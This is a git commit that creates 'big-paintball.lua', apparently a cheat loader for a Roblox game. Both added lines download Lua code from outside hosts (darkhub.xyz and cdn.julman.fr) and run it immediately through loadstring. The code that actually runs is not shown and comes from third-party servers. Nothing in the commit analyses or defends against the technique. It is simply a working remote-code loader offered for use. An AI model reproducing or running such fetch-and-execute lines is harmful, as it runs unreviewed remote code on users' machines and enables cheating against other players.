c934b9231f39fcb5977849e6d7f8438c2ba6e0d8
Trix <80095537+TrixAde@users.noreply.github.com>
2021-09-05 21:32:59 +0200

    Create big-paintball.lua

---
+++ big-paintball.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet(("https://darkhub.xyz/remote-script.lua"), true))()
+-----------------------------------------------------------------------------
+pcall(loadstring(game:HttpGet("https://cdn.julman.fr/scripts/34.lua")))
